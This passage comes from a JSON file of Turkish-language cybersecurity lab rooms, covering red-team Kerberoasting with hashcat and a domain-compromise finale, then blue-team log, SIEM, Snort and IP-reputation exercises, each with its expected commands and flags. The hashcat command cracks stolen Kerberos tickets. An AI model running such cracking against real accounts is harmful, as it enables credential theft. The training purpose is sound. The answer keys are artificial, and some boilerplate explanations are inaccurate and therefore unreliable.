                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Session..........: hashcat",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "-m 13100",
                "desc": "Bu odadaki (Parola Kırma: Hashcat ile Kerberoasting TGS Offline Crack) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt` komutunun temel amacı nedir?",
            "options": [
                "Ele geçirilen tgs_ticket.hash dosyasını RockYou sözlüğüyle kırmak için hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt` komutu ezbere yazılan bir kod değil; -m 13100: Kerberos 5 TGS-REP etype 23 hash formatını seçer. -a 0: Düz sözlük (Dictionary) saldırı modudur."
        }
    },
    {
        "id": "red-312",
        "track": "red",
        "title": "Red Team Zirvesi: Full Domain Compromise & Tahtın Fethi",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "DOMAIN TAKEOVER & GOLDEN TICKET",
        "theory": "### Ofansif Operasyonun Zirvesi: Krallığın Düşüşü\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKalenin dış kapısındaki çatlaktan (Web zafiyeti) girdiniz, nöbetçiyi atlattınız (Yetki yükseltme), vezirin ceketinden anahtarları aldınız (Pass-the-Hash) ve şimdi kralın taht odasında sarayın tapusunu (Domain Controller & Golden Ticket) mühürlediniz. Red Team operasyonu tamamlandı.\n\n#### 20 Red Team Odasını Tamamladınız!\nWeb sızma testinden, EDR bypass tekniklerine, Active Directory saldırı zincirlerinden C2 komuta kontrol altyapılarına kadar tam donanımlı bir ofansif güvenlik uzmanı oldunuz.",
        "mission": "Domain Controller sunucusundaki nihai zafer bayrağını okumak için cat /root/flags/domain_compromise_final.txt komutunu çalıştırın.",
        "expectedCommand": "cat /root/flags/domain_compromise_final.txt",
        "acceptedCommands": [
            "cat /root/flags/domain_compromise_final.txt",
            "cat domain_compromise_final.txt",
            "more /root/flags/domain_compromise_final.txt"
        ],
        "hintExplanation": "<p><strong>domain_compromise_final.txt:</strong> 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır.</p>",
        "terminalSuccessOutput": "========================================================================\n👑 TEBRİKLER! RED TEAM OFANSİF OPERASYON PATİKASINI FETHETTİNİZ! 👑\n========================================================================\n[KAZANILAN OFANSİF YETKİNLİKLER]:\n✔ Ağ & Web Sızma: SSRF, Blind SQLi, Metasploit & Exploit Zinciri\n✔ Yetki Yükseltme & Bypass: Linux SUID, Windows Token, EDR Hook Bypass\n✔ Active Directory Hakimiyeti: Kerberoasting, BloodHound, Mimikatz, PtH\n✔ İleri Düzey Operasyonlar: Chisel Pivotlama, GPU Hashcat, C2 Sliver/Cobalt\n\n[RED TEAM NİHAİ BAYRAĞI]: LFL{red_full_domain_compromise_crown_captured}\n========================================================================",
        "flag": "LFL{red_full_domain_compromise_crown_captured}",
        "nextId": "blue-101",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `cat /root/flags/domain_compromise_final.txt` komutunu kullanmamızın sebebi; **Red Team Zirvesi: Full Domain Compromise & Tahtın Fethi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. domain_compromise_final.txt: 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır.",
        "cmdAnatomy": [
            {
                "token": "cat",
                "role": "Ana Komut (Concatenate / Dosya Oku)",
                "desc": "Bir metin dosyasının içindeki yazıları açıp doğrudan terminal ekranına yazdırır."
            },
            {
                "token": "/root/flags/domain_compromise_final.txt",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/root/flags/domain_compromise_final.txt)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "========================================================================",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "👑 TEBRİKLER! RED TEAM OFANSİF OPERASYON PATİKASINI FETHETTİNİZ! 👑",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "========================================================================",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[KAZANILAN OFANSİF YETKİNLİKLER]:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "cat",
                "desc": "Red Team Zirvesi: Full Domain Compromise & Tahtın Fethi görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `cat /root/flags/domain_compromise_final.txt` komutunun temel amacı nedir?",
            "options": [
                "Domain Controller sunucusundaki nihai zafer bayrağını okumak için cat /root/flags/domain_compromise_final.txt",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `cat /root/flags/domain_compromise_final.txt` komutu ezbere yazılan bir kod değil; domain_compromise_final.txt: 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır."
        }
    },
    {
        "id": "blue-101",
        "track": "blue",
        "title": "Gelişmiş Günlük Yönetimi: Linux Syslog & Auth Logs",
        "level": "1. Temel Altyapı ve İzleme",
        "badge": "LOG ARCHITECTURE & EVENT IDS",
        "theory": "### Savunmanın Temeli: Normal Davranışı Bilmek\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir binanın girişindeki güvenlik kulübesinde duran ziyaretçi defteridir. Kim geldi, saat kaçta geldi, hangi kapıyı zorladı? Defterde gece saat 03:00'te aynı kişinin 100 kere yanlış anahtar denediğini görürseniz bu bir hırsızlık teşebbüsüdür!\n\nSavunma yapabilmek için neyi koruduğunuzu ve normal sistem davranışının ne olduğunu bilmeniz gerekir.\n\n#### 1. Windows Event Logs & Kritik Event ID'ler:\n* **Event ID 4624 / 4625:** Başarılı / Başarısız oturum açma.\n* **Event ID 4672:** Yönetici (Special Privileges) haklarıyla oturum açıldığında üretilir.\n* **Event ID 7045:** Sisteme yeni bir Windows servisi kurulduğunda tetiklenir.\n\n#### 2. Linux Syslog Mimarisi:\n* `/var/log/auth.log`: Kimlik doğrulama, SSH ve sudo aktiviteleri.\n* `/var/log/syslog`: Çekirdek ve servislerin genel olay akışı.",
        "mission": "Linux kimlik doğrulama günlüğünde (/var/log/auth.log) başarısız olan (Failed password) SSH oturum açma denemelerini filtreleyin.",
        "expectedCommand": "grep \"Failed password\" /var/log/auth.log",
        "acceptedCommands": [
            "grep 'Failed password' /var/log/auth.log",
            "grep \"Failed password for\" /var/log/auth.log",
            "grep 'Failed password for' /var/log/auth.log",
            "cat /var/log/auth.log | grep \"Failed password\""
        ],
        "hintExplanation": "<p><strong>grep:</strong> Linux'ta devasa metin dosyaları içinde aradığınız kelimeyi saniyeler içinde bulan arama motorudur.</p>\n<p><strong>\"Failed password\":</strong> SSH sunucusunun yanlış şifre girildiğinde günlüğe yazdığı standart uyarıdır.</p>\n<p><strong>/var/log/auth.log:</strong> Linux sistemlerde kimin sisteme girmeye çalıştığını kaydeden güvenlik günlüğüdür.</p>",
        "terminalSuccessOutput": "[+] AUTH.LOG AYRIŞTIRILIYOR...\nNov 08 14:12:01 lfl-srv sshd[4201]: Failed password for root from 192.168.1.185 port 55432 ssh2\nNov 08 14:12:03 lfl-srv sshd[4204]: Failed password for root from 192.168.1.185 port 55434 ssh2\nNov 08 14:12:05 lfl-srv sshd[4208]: Failed password for invalid user admin from 192.168.1.185 port 55436 ssh2\n[ALERT] 192.168.1.185 adresinden kaba kuvvet (brute-force) saldırısı tespit edildi!\n[FLAG] LFL{blue_syslog_auth_bruteforce_isolated}",
        "flag": "LFL{blue_syslog_auth_bruteforce_isolated}",
        "nextId": "blue-102",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı ve İzleme) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `grep \"Failed password\" /var/log/auth.log` komutunu kullanmamızın sebebi; **Gelişmiş Günlük Yönetimi: Linux Syslog & Auth Logs** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. grep: Linux'ta devasa metin dosyaları içinde aradığınız kelimeyi saniyeler içinde bulan arama motorudur. \"Failed password\": SSH sunucusunun yanlış şifre girildiğinde günlüğe yazdığı standart uyarıdır. /var/log/auth.log: Linux sistemlerde kimin sisteme girmeye çalıştığını kaydeden güvenlik günlüğüdür.",
        "cmdAnatomy": [
            {
                "token": "grep",
                "role": "Ana Komut (Metin Filtreleme)",
                "desc": "Samanlıkta iğne arar gibi binlerce satırlık yazı içinde sadece aradığın kelimeyi içeren satırları süzüp getirir."
            },
            {
                "token": "\"Failed password\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"Failed password\")."
            },
            {
                "token": "/var/log/auth.log",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/var/log/auth.log)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] AUTH.LOG AYRIŞTIRILIYOR...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Nov 08 14:12:01 lfl-srv sshd[4201]: Failed password for root from 192.16...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Nov 08 14:12:03 lfl-srv sshd[4204]: Failed password for root from 192.16...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Nov 08 14:12:05 lfl-srv sshd[4208]: Failed password for invalid user adm...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "/var/log/auth.log",
                "desc": "Bu odadaki (Gelişmiş Günlük Yönetimi: Linux Syslog & Auth Logs) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "/var/log/syslog",
                "desc": "Bu odadaki (Gelişmiş Günlük Yönetimi: Linux Syslog & Auth Logs) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `grep \"Failed password\" /var/log/auth.log` komutunun temel amacı nedir?",
            "options": [
                "Linux kimlik doğrulama günlüğünde (/var/log/auth.log) başarısız olan (Failed password) SSH oturum açma denemelerini filtreleyin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `grep \"Failed password\" /var/log/auth.log` komutu ezbere yazılan bir kod değil; grep: Linux'ta devasa metin dosyaları içinde aradığınız kelimeyi saniyeler içinde bulan arama motorudur. \"Failed password\": SSH sunucusunun yanlış şifre girildiğinde günlüğe yazdığı standart uyarıdır. /var/log/auth.log: Linux sistemlerde kimin sisteme girmeye çalıştığını kaydeden güvenlik günlüğüdür."
        }
    },
    {
        "id": "blue-102",
        "track": "blue",
        "title": "Merkezi Log ve SIEM Mimarisi: Wazuh, Splunk & Elastic",
        "level": "1. Temel Altyapı ve İzleme",
        "badge": "SIEM & CENTRALIZED LOGGING",
        "theory": "### Dağınık Loglardan Anlam Çıkarmak: SIEM\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir hastanedeki 500 hastanın koluna tansiyon ve nabız sensörü takıp, başhekimin odasındaki tek bir dev ekranda nabzı yükselen hastanın odasının otomatik kırmızı alarm vermesini sağlamaktır.\n\nBir kurumda yüzlerce sunucu, firewall ve binlerce uç nokta varken logları tek tek makinelere girerek inceleyemezsiniz.\n\n#### 1. SIEM Bileşenleri:\n* **Log Toplayıcı (Forwarder):** Uç noktalardan logları merkeze iletir.\n* **Ayrıştırıcı (Parser):** Farklı kaynaklardan gelen logları ortak standarda dönüştürür.\n* **Korelasyon Motoru:** Bağımsız olayları birleştirerek saldırı senaryosu üretir.",
        "mission": "Splunk ortamında başarısız oturum açma olay kodunu (EventCode=4625) sorgulayarak hedef kullanıcı adlarına göre gruplayan SPL komutunu çalıştırın.",
        "expectedCommand": "index=windows EventCode=4625 | stats count by TargetUserName",
        "acceptedCommands": [
            "index=windows EventCode=4625",
            "index=windows EventCode=4625 | stats count",
            "EventCode=4625"
        ],
        "hintExplanation": "<p><strong>index=windows:</strong> Splunk içinde Windows makinelerden toplanan log havuzunu seçer.</p>\n<p><strong>EventCode=4625:</strong> Windows'un 'Yanlış Şifre Girildi / Oturum Açılamadı' olay kodudur.</p>\n<p><strong>| stats count by TargetUserName:</strong> Logları analiz motoruna aktarır ve hangi kullanıcı adına kaç kere yanlış şifre denendiğini sayıp listeler.</p>",
        "terminalSuccessOutput": "TargetUserName    count\n----------------  -----\nadministrator     1482\nsql_service       320\nguest             45\n[+] SIEM Korelasyonu Tetiklendi: High-Severity Brute Force Incident #9412\n[FLAG] LFL{siem_splunk_event4625_aggregated}",
        "flag": "LFL{siem_splunk_event4625_aggregated}",
        "nextId": "blue-103",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı ve İzleme) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `index=windows EventCode=4625 | stats count by TargetUserName` komutunu kullanmamızın sebebi; **Merkezi Log ve SIEM Mimarisi: Wazuh, Splunk & Elastic** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. index=windows: Splunk içinde Windows makinelerden toplanan log havuzunu seçer. EventCode=4625: Windows'un 'Yanlış Şifre Girildi / Oturum Açılamadı' olay kodudur. | stats count by TargetUserName: Logları analiz motoruna aktarır ve hangi kullanıcı adına kaç kere yanlış şifre denendiğini sayıp listeler.",
        "cmdAnatomy": [
            {
                "token": "index=windows",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (index=windows)."
            },
            {
                "token": "EventCode=4625",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (EventCode=4625)."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe / Aktarım)",
                "desc": "Sol taraftaki komutun ürettiği ekran çıktısını alır, sağ taraftaki komuta girdi olarak aktarır (iki komutu birbirine bağlar)."
            },
            {
                "token": "stats",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (stats)."
            },
            {
                "token": "count",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (count)."
            },
            {
                "token": "by",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (by)."
            },
            {
                "token": "TargetUserName",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (TargetUserName)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "TargetUserName    count",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "----------------  -----",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "administrator     1482",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "sql_service       320",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "index=windows",
                "desc": "Merkezi Log ve SIEM Mimarisi: Wazuh, Splunk & Elastic görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `index=windows EventCode=4625 | stats count by TargetUserName` komutunun temel amacı nedir?",
            "options": [
                "Splunk ortamında başarısız oturum açma olay kodunu (EventCode=4625) sorgulayarak hedef kullanıcı adlarına göre gruplayan SPL",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `index=windows EventCode=4625 | stats count by TargetUserName` komutu ezbere yazılan bir kod değil; index=windows: Splunk içinde Windows makinelerden toplanan log havuzunu seçer. EventCode=4625: Windows'un 'Yanlış Şifre Girildi / Oturum Açılamadı' olay kodudur. | stats count by TargetUserName: Logları analiz motoruna aktarır ve hangi kullanıcı adına kaç kere yanlış şifre denendiğini sayıp listeler."
        }
    },
    {
        "id": "blue-103",
        "track": "blue",
        "title": "Ağ Savunması ve İzleme (NSM): Snort, Suricata & Zeek",
        "level": "1. Temel Altyapı ve İzleme",
        "badge": "NETWORK SECURITY & IDS/IPS",
        "theory": "### Ağ Hattında Pusu: NSM ve İmza Tabanlı Tespit\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nHavalimanındaki X-Ray cihazıdır. Bavulun içindeki eşyaların röntgenine bakar, silah veya patlayıcıya benzeyen bir metal görürse cihaz öter (IDS) ve bavulun uçağa yüklenmesini engeller (IPS).\n\nAğ Güvenliği İzleme (Network Security Monitoring - NSM), kablodan geçen veriyi analiz ederek kötü niyetli paketleri hattan geçerken yakalar.\n\n#### 1. IDS (Tespit) vs IPS (Engelleme):\n* **IDS:** Trafiği pasif olarak dinler ve alarm üretir (Trafiği kesmez).\n* **IPS:** Trafiğin tam ortasında (inline) durur; zararlı paket algıladığında oturumu anında sonlandırır.",
        "mission": "Snort IDS motorunu yerel kural yapılandırması ve 'attack.pcap' paket analizi modunda çalıştırarak web shell yükleme girişimini yakalayın.",
        "expectedCommand": "snort -q -c /etc/snort/snort.conf -r attack.pcap",
        "acceptedCommands": [
            "snort -A console -q -c /etc/snort/snort.conf -r attack.pcap",
            "snort -c /etc/snort/snort.conf -r attack.pcap",
            "suricata -r attack.pcap"
        ],
        "hintExplanation": "<p><strong>snort:</strong> Ağ trafiğindeki zararlı paketleri imzalara bakarak tespit eden açık kaynak IDS sistemidir.</p>\n<p><strong>-q:</strong> 'Quiet' yani gereksiz başlangıç yazılarını gizler, sadece alarmları gösterir.</p>\n<p><strong>-c /etc/snort/snort.conf:</strong> Hangi saldırı kurallarının yükleneceğini belirten ana ayar dosyasıdır.</p>\n<p><strong>-r attack.pcap:</strong> Canlı ağ yerine kaydedilmiş şüpheli paket dosyasını baştan sona analiz eder.</p>",
        "terminalSuccessOutput": "08/11-15:02:11.412901 [**] [1:100005:1] LFL - Web Shell Giris Denemesi [**] [Priority: 1] {TCP} 10.0.0.88:41202 -> 192.168.1.10:80\n[DROP] Paket IPS motoru tarafından düşürüldü ve bağlantı kesildi.\n[FLAG] LFL{snort_suricata_nsm_signature_matched}",
        "flag": "LFL{snort_suricata_nsm_signature_matched}",
        "nextId": "blue-201",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı ve İzleme) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `snort -q -c /etc/snort/snort.conf -r attack.pcap` komutunu kullanmamızın sebebi; **Ağ Savunması ve İzleme (NSM): Snort, Suricata & Zeek** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. snort: Ağ trafiğindeki zararlı paketleri imzalara bakarak tespit eden açık kaynak IDS sistemidir. -q: 'Quiet' yani gereksiz başlangıç yazılarını gizler, sadece alarmları gösterir. -c /etc/snort/snort.conf: Hangi saldırı kurallarının yükleneceğini belirten ana ayar dosyasıdır. -r attack.pcap: Canlı ağ yerine kaydedilmiş şüpheli paket dosyasını baştan sona analiz eder.",
        "cmdAnatomy": [
            {
                "token": "snort",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (snort)."
            },
            {
                "token": "-q",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-q)."
            },
            {
                "token": "-c",
                "role": "Parametre (Count / Adet)",
                "desc": "Kaç adet test paketi gönderileceğini belirler (Linux'ta bunu yazmazsan ping sonsuza kadar devam eder)."
            },
            {
                "token": "/etc/snort/snort.conf",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/etc/snort/snort.conf)."
            },
            {
                "token": "-r",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-r)."
            },
            {
                "token": "attack.pcap",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (attack.pcap)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "08/11-15:02:11.412901 [**] [1:100005:1] LFL - Web Shell Giris Denemesi [...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[DROP] Paket IPS motoru tarafından düşürüldü ve bağlantı kesildi.",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "snort",
                "desc": "Ağ Savunması ve İzleme (NSM): Snort, Suricata & Zeek görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `snort -q -c /etc/snort/snort.conf -r attack.pcap` komutunun temel amacı nedir?",
            "options": [
                "Snort IDS motorunu yerel kural yapılandırması ve 'attack.pcap' paket analizi modunda çalıştırarak web shell yükleme girişimini yakalayın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `snort -q -c /etc/snort/snort.conf -r attack.pcap` komutu ezbere yazılan bir kod değil; snort: Ağ trafiğindeki zararlı paketleri imzalara bakarak tespit eden açık kaynak IDS sistemidir. -q: 'Quiet' yani gereksiz başlangıç yazılarını gizler, sadece alarmları gösterir. -c /etc/snort/snort.conf: Hangi saldırı kurallarının yükleneceğini belirten ana ayar dosyasıdır. -r attack.pcap: Canlı ağ yerine kaydedilmiş şüpheli paket dosyasını baştan sona analiz eder."
        }
    },
    {
        "id": "blue-201",
        "track": "blue",
        "title": "SOC Analistliği: Alarm Triyajı, True vs False Positive",
        "level": "2. Tehdit Avcılığı ve Analiz",
        "badge": "SOC OPERATIONS & TRIAGE",
        "theory": "### SOC Masasında Hayat: Gürültüyü Ayıklamak\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEvinizin yangın alarmı yemek pişirirken çıkan ekmek kızartma dumanına ötüyorsa bu **False Positive (Yanlış Alarm)**'dır. Gerçekten perdeler tutuştuğunda ötüyorsa bu **True Positive (Gerçek Alarm)**'dır. Bir SOC analistinin en büyük görevi yanlış alarmlara vakit kaybetmeden gerçek yangınları anında tespit etmektir.\n\nGüvenlik Operasyon Merkezi (SOC) analisti her gün yüzlerce alarm alır. En kritik yetenek alarm triyajıdır.\n\n#### 1. Alarm Sınıflandırması:\n* **Gerçek Pozitif (True Positive):** Gerçekten bir saldırı var ve alarm doğru çaldı.\n* **Yanlış Pozitif (False Positive):** Saldırı yok ancak güvenlik kuralı meşru bir trafiği zararlı zannetti.",
        "mission": "SOC ekranına düşen şüpheli 185.220.101.5 IP adresinin tehdit itibar skorunu AbuseIPDB API sorgusu ile denetleyin.",
        "expectedCommand": "curl -s \"https://api.abuseipdb.com/check?ip=185.220.101.5\"",
        "acceptedCommands": [
            "curl -s https://api.abuseipdb.com/check?ip=185.220.101.5",
            "abuseipdb-check --ip 185.220.101.5 --threshold 80",
            "abuseipdb-check 185.220.101.5",
            "whois 185.220.101.5"
        ],
        "hintExplanation": "<p><strong>curl:</strong> Terminal üzerinden internetteki bir web adresine veya API'ye istek gönderme aracıdır.</p>\n<p><strong>-s:</strong> 'Silent' modu açar, gereksiz indirme yazılarını gizler ve doğrudan sonucu ekrana yazar.</p>\n<p><strong>api.abuseipdb.com:</strong> Dünyadaki siber güvenlik uzmanlarının şüpheli IP'leri ihbar ettiği küresel kara liste veritabanıdır.</p>",
        "terminalSuccessOutput": "[+] AbuseIPDB Raporu: 185.220.101.5\nKötüye Kullanım Güven Skoru: %100 (HIGH RISK)\nKategori: Tor Çıkış Düğümü / Web Saldırıları / Brute Force\nSon 24 Saatteki Rapor Sayısı: 421 Rapor\n[SONUÇ]: TRUE POSITIVE - Saldırgan IP derhal Firewall üzerinden bloklanmalıdır.\n[FLAG] LFL{soc_triage_true_positive_confirmed}",
        "flag": "LFL{soc_triage_true_positive_confirmed}",
        "nextId": "blue-202",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Tehdit Avcılığı ve Analiz) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `curl -s \"https://api.abuseipdb.com/check?ip=185.220.101.5\"` komutunu kullanmamızın sebebi; **SOC Analistliği: Alarm Triyajı, True vs False Positive** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. curl: Terminal üzerinden internetteki bir web adresine veya API'ye istek gönderme aracıdır. -s: 'Silent' modu açar, gereksiz indirme yazılarını gizler ve doğrudan sonucu ekrana yazar. api.abuseipdb.com: Dünyadaki siber güvenlik uzmanlarının şüpheli IP'leri ihbar ettiği küresel kara liste veritabanıdır.",
        "cmdAnatomy": [
            {
                "token": "curl",
                "role": "Ana Komut (Web İstemcisi)",
                "desc": "'Client URL' kısaltmasıdır. Tarayıcı açmadan terminal üzerinden bir web sitesine bağlanıp veri veya başlık (header) çekmeye yarar."
            },
            {
                "token": "-s",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-s)."
            },
            {
                "token": "\"https://api.abuseipdb.com/check?ip=185.220.101.5\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"https://api.abuseipdb.com/check?ip=185.220.101.5\")."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] AbuseIPDB Raporu: 185.220.101.5",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Kötüye Kullanım Güven Skoru: %100 (HIGH RISK)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Kategori: Tor Çıkış Düğümü / Web Saldırıları / Brute Force",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Son 24 Saatteki Rapor Sayısı: 421 Rapor",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "curl",
                "desc": "SOC Analistliği: Alarm Triyajı, True vs False Positive görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `curl -s \"https://api.abuseipdb.com/check?ip=185.220.101.5\"` komutunun temel amacı nedir?",
            "options": [
                "SOC ekranına düşen şüpheli 185.220.101.5 IP adresinin tehdit itibar skorunu AbuseIPDB API sorgusu ile denetleyin.",
